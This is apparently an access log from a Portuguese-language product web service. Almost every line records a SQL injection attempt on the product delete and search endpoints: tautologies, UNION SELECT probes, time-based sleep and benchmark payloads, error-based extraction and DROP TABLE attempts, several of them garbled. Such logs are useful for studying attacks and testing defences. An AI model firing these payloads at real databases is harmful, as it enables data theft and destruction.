Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - DELETE /produtos/testAND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107))) HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20where%206272%20=%206272%20or%207417%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20rlike%20(%20select%20(%20case%20when%20(%207689%20=%207689%20)%20then%201%20else%200x28%20end%20)%20)%20and%20%22tbbk%22%20like%20%22tbbk HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20as%20lgxc%20where%201117%20=%201117%20union%20all%20select%20null,null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%7C%7C%20(%20select%20'eczo'%20from%20dual%20where%204816%20=%204816 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20where%202680%20=%202680%20or%20elt%20(%205873%20=%205873,sleep%20(%205%20)%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/test-9688%25'%20)%20)%20)%20or%20elt%20(%203695%20=%207995,7995%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20as%20fmpr%20where%203103%20=%203103%20and%20elt%20(%209970%20=%209297,9297%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20and%206414%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20(%20(%20'ydob'%20=%20'ydob HTTP/1.1
172.18.0.1 - DELETE /produtos/test-5020%25')%20or%203440=cast((chr(113)%7C%7Cchr(113)%7C%7Cchr(112)%7C%7Cchr(106)%7C%7Cchr(113))%7C%7C(select%20(case%20when%20(3440=3440)%20then%201%20else%200%20end))::text%7C%7C(chr(113)%7C%7Cchr(122)%7C%7Cchr(118)%7C%7Cchr(122)%7C%7Cchr(113))%20as%20numeric)%20and%20('%25'=' HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'+%20(%20select%20taga%20where%208036%20=%208036 HTTP/1.1
172.18.0.1 - DELETE /produtos/test57jg00vchsk4ul0x74phz9shvx5q%20kaezdnqhjrrz5fzvkmvg6qck%20cl4phyd3kwqad43q42ekav4do9ch74bcjo30zxz1af0pcf4omh0q7ijhm05cban%201l0etpa39ambewhtuwbxyg4xdf9oms98tjtdnvedhokllzarq738my8xoxnno5fk4wlqtoqx1nogsjmdnaehtat51v94qeytcyezdu0h63j%20w2rx4dac8wd7u6diaoqx7ayzga6 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271+--&categoria=%27+OR+%271%27%3D%271+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%23&categoria=%27+OR+%271%27%3D%271%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture%29+enverate+inverity+where+2165+%3D+2165&categoria=%27+UNION+SELECT+%40+%2C+users%2Calecture%29+enverate+inverity+where+2165+%3D+2165 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%28+--&categoria=%27+UNION+SELECT+%40%28+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+userschame+conversitanhes+%28+t1+end+-+1+--&categoria=%27+UNION+SELECT+%40+%2C+userschame+conversitanhes+%28+t1+end+-+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+waschemamilal+lys%27%2C%27s%27%2C%27%3B+%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+waschemamilal+lys%27%2C%27s%27%2C%27%3B+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+--&categoria=%27+UNION+SELECT+%40+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl+%2C+%28+%2C1%2C1%2C0%2C1%2C0+AND+1+%29+%3D+1+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl+%2C+%28+%2C1%2C1%2C0%2C1%2C0+AND+1+%29+%3D+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char%3Bly%24tybe_%29%3Bat%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char%3Bly%24tybe_%29%3Bat%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_nible%2C+versibnet+%28+%28+SELECT+DISTINCT+%28+USERNAME+%29+%2C+ROWNUM+AS+LIMIT+FROM+sys.all_tables+%29+WHERE+LIMIT+%3D+7+%29+%29+AND+%27i%27+%3D+%27i&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_nible%2C+versibnet+%28+%28+SELECT+DISTINCT+%28+USERNAME+%29+%2C+ROWNUM+AS+LIMIT+FROM+sys.all_tables+%29+WHERE+LIMIT+%3D+7+%29+%29+AND+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmale%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmale%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmate+ind+%28+%21+%3C%3D+%2C%40ber%2C1%2C1%2C1+%29+%29+%3B%3D+1+--&categoria=%27+UNION+SELECT+%40+verseoncmate+ind+%28+%21+%3C%3D+%2C%40ber%2C1%2C1%2C1+%29+%29+%3B%3D+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28+count+%29+and+%27ctab%27+like+%27ctab&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28+count+%29+and+%27ctab%27+like+%27ctab HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+SELECT+VErSION+%28+SELECT+5%29+VERSION+%28+%29+--+1%2C1%2Cdur&categoria=%27+UNION+SELECT+%28+%2C+SELECT+VErSION+%28+SELECT+5%29+VERSION+%28+%29+--+1%2C1%2Cdur HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade%2Ccall+regenpease_ther+i&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade%2Ccall+regenpease_ther+i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2Cversion+%28+%29+%2C+.%3Cver+1%2C4%2C1+0&categoria=%27+UNION+SELECT+%28+%2C+users%2Cversion+%28+%29+%2C+.%3Cver+1%2C4%2C1+0 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+SELECT+version%28%29+%2C+corname+from+sysable_pase+%29+%3B%26%26+true+AND+%27I%27+NoT+like+%27i%27%27+ANd+%27&categoria=%27+UNION+SELECT+%28+%2C+SELECT+version%28%29+%2C+corname+from+sysable_pase+%29+%3B%26%26+true+AND+%27I%27+NoT+like+%27i%27%27+ANd+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%29+%2Cule%2Ctale_name+%29&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%29+%2Cule%2Ctale_name+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmatecbumpable+%29+%29+AND+%28+%22ilbb%22+like+%22iblo&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmatecbumpable+%29+%29+AND+%28+%22ilbb%22+like+%22iblo HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cadechare+%29+%3B%27tays%27+%29+%3B%3C&categoria=%27+UNION+SELECT+%40+%2C+users%2Cadechare+%29+%3B%27tays%27+%29+%3B%3C HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%28+userint%2CnelanD+%27eN%29%2Culp+%29+E&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%28+userint%2CnelanD+%27eN%29%2Culp+%29+E HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%28+%29+%2C+select+%40%40verseon%2C+%29+%29+%2C1+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%28+%29+%2C+select+%40%40verseon%2C+%29+%29+%2C1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%28+%29+%2C+select+%40verseon+%29+%29+%3E+FW&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%28+%29+%2C+select+%40verseon+%29+%29+%3E+FW HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40%40+--&categoria=%27+UNION+SELECT+%40%40%40+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%29+velcement+1+tibm_tabcate+1%2Cversible%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%29+velcement+1+tibm_tabcate+1%2Cversible%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+%7C%7C+%27i%27+%3D+%27&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+%7C%7C+%27i%27+%3D+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%28-&categoria=%27+UNION+SELECT+%40%28- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmant+iDe+FOR+table_ast&categoria=%27+UNION+SELECT+%40+verseoncmant+iDe+FOR+table_ast HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calectame+%27%29+%2C+%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Calectame+%27%29+%2C+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_name%27+%29+from+tubl_name_chir&categoria=%27+UNION+SELECT+table_name%27+%29+from+tubl_name_chir HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmant+ide+LIce_tabentamE+%29+--&categoria=%27+UNION+SELECT+%40+verseoncmant+ide+LIce_tabentamE+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cadechure+%29+%2C+%27s%2C%27%2Cvers+lime+%28+%2C+%29+%2C+truet&categoria=%27+UNION+SELECT+%40+%2C+users%2Cadechure+%29+%2C+%27s%2C%27%2Cvers+lime+%28+%2C+%29+%2C+truet HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%28%2C+select+%40%40versionnand+1%29+%3D+%271x1%27%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%28%2C+select+%40%40versionnand+1%29+%3D+%271x1%27%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+--&categoria=%27%3B+DROP+TABLE+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SE&categoria=%27%3B+DROP+TABLE+SE HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+S+--&categoria=%27%3B+DROP+TABLE+S+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+%28+--&categoria=%27%3B+DROP+TABLE+%28+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEM&categoria=%27%3B+DROP+TABLE+SEM HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+-+--&categoria=%27%3B+DROP+TABLE+-+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SECT+UNOR+EXTRO1+%29&categoria=%27%3B+DROP+TABLE+SECT+UNOR+EXTRO1+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+Se&categoria=%27%3B+DROP+TABLE+Se HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%22+--&categoria=%22+OR+%221%22%3D%221%22+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%23%22+--&categoria=%22+OR+%221%22%3D%221%23%22+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%22+%29+%29+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+and+%28+%28+%28+%22%25%22+%3D+%22&categoria=1%25%22+%29+%29+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+and+%28+%28+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+and+%22ssfu%22+%3D+%22ssfu&categoria=1%22+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+and+%22ssfu%22+%3D+%22ssfu HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+beld+where+1679+%3D+1679+or+sleep+%28+5+%29+%23&categoria=1+%29+%29+as+beld+where+1679+%3D+1679+or+sleep+%28+5+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+lfia+where+4924+%3D+4924&categoria=1+%29+as+lfia+where+4924+%3D+4924 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+ynzg+where+1926+%3D+1926+or+%28+select+9173+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9173+%3D+9173%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a+%29+--&categoria=1+%29+%29+as+ynzg+where+1926+%3D+1926+or+%28+select+9173+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9173+%3D+9173%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+or+exp+%28+~+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+6270+%3D+6270%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+x+%29+%29+and+%28+%28+%27dgwe%27+like+%27dgwe+--&categoria=1%27+%29+%29+or+exp+%28+~+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+6270+%3D+6270%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+x+%29+%29+and+%28+%28+%27dgwe%27+like+%27dgwe+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+bvuz+where+4036+%3D+4036&categoria=1+%29+as+bvuz+where+4036+%3D+4036 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-4679+where+9634+%3D+9634+union+all+select+9634%2C9634%2C9634%2C9634%2C9634%2C9634%2C9634+--&categoria=-4679+where+9634+%3D+9634+union+all+select+9634%2C9634%2C9634%2C9634%2C9634%2C9634%2C9634+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+where+6005+%3D+6005+rlike+sleep+%28+5+%29+%23&categoria=1%27+where+6005+%3D+6005+rlike+sleep+%28+5+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-7552+or+6872+%3D+6872&categoria=-7552+or+6872+%3D+6872 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-4979%27+%29+%29+or+4493+%3D+utl_inaddr.get_host_address+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+4493+%3D+4493+%29+then+1+else+0+end+%29+from+dual+%29+%7C%7Cchr+%28+113&categoria=-4979%27+%29+%29+or+4493+%3D+utl_inaddr.get_host_address+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+4493+%3D+4493+%29+then+1+else+0+end+%29+from+dual+%29+%7C%7Cchr+%28+113 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+tsge+where+6970+%3D+6970&categoria=1%27+%29+as+tsge+where+6970+%3D+6970 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-4904%27%29%29+or+8571%3D8571+--&categoria=-4904%27%29%29+or+8571%3D8571+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+or+2633+%3D+dbms_pipe.receive_message+%28+chr+%28+112+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+103+%29+%2C5+%29+and+%28+%28+8554+%3D+8554&categoria=1+%29+%29+or+2633+%3D+dbms_pipe.receive_message+%28+chr+%28+112+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+103+%29+%2C5+%29+and+%28+%28+8554+%3D+8554 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+and+3715+in+%28+%28+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+3715+%3D+3715+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bchar+%28+113+%29+%2Bchar+%28+122+%29+%2Bchar+%28+118+%29+%2Bchar+%28+122+%29+%2Bchar+%28+113+%29+%29&categoria=1%27+and+3715+in+%28+%28+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+3715+%3D+3715+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bchar+%28+113+%29+%2Bchar+%28+122+%29+%2Bchar+%28+118+%29+%2Bchar+%28+122+%29+%2Bchar+%28+113+%29+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=if+%28+4124+%3D+4133+%29+select+4312+else+drop+function+xtlt+--&categoria=if+%28+4124+%3D+4133+%29+select+4312+else+drop+function+xtlt+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%27+%29+and+%28+select+9067+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9067+%3D+9067%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a&categoria=1%25%27+%29+and+%28+select+9067+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9067+%3D+9067%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%2B+%28+select+%27rpbx%27+where+6748+%3D+6748+and+elt+%28+4249+%3D+4249%2C7259+%29+%29+%2B%27&categoria=1%27%2B+%28+select+%27rpbx%27+where+6748+%3D+6748+and+elt+%28+4249+%3D+4249%2C7259+%29+%29+%2B%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+and+5556+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29&categoria=1%27+%29+and+5556+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+srmq+%29+and+%28+%28+%28+%22%25%22+%3D+%22&categoria=%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+srmq+%29+and+%28+%28+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+as+rbpl+where+1828+%3D+1828+and+9254+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+--&categoria=1%22+%29+as+rbpl+where+1828+%3D+1828+and+9254+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%2C%28select+%28case+when+%285334%3D4976%29+then+1+else+cast%281+as+int%29%2F%28select+0+from+dual%29+end%29+from+dual%29&categoria=1%2C%28select+%28case+when+%285334%3D4976%29+then+1+else+cast%281+as+int%29%2F%28select+0+from+dual%29+end%29+from+dual%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+and+8514+%3D+%28+select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+%29&categoria=1+%29+and+8514+%3D+%28+select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+and+%28+select+9067+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9067+%3D+9067%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a&categoria=1%27+%29+and+%28+select+9067+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9067+%3D+9067%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-2631%22+%29+where+7631+%3D+7631+or+7431+%3D+9814%23&categoria=-2631%22+%29+where+7631+%3D+7631+or+7431+%3D+9814%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22%29%29%29+and+exp%28~%28select+%2A+from+%28select+concat%280x7171706a71%2C%28select+%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29+and+%28%28%28%22uifm%22%3D%22uirf&categoria=1%22%29%29%29+and+exp%28~%28select+%2A+from+%28select+concat%280x7171706a71%2C%28select+%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29+and+%28%28%28%22uifm%22%3D%22uirf HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+eymt+where+3911+%3D+3911+or+4411+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+--&categoria=1%27+%29+as+eymt+where+3911+%3D+3911+or+4411+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+and+%28+3020+%3D+3020+%29+%2A6703+and+%28+%27lhfa%27+%3D+%27lhfa&categoria=1%27+%29+and+%28+3020+%3D+3020+%29+%2A6703+and+%28+%27lhfa%27+%3D+%27lhfa HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%22+%29+and+8635+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+--&categoria=1%25%22+%29+and+8635+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+bedq+where+8781+%3D+8781+or+8466+%3D+benchmark+%28+5000000%2Cmd5+%28+0x694a4745+%29+%29+--&categoria=1%27+%29+%29+as+bedq+where+8781+%3D+8781+or+8466+%3D+benchmark+%28+5000000%2Cmd5+%28+0x694a4745+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29&categoria=1%22+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+and+%22vcup%22+%3D+%22vcup&categoria=select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+and+%22vcup%22+%3D+%22vcup HTTP/1.1
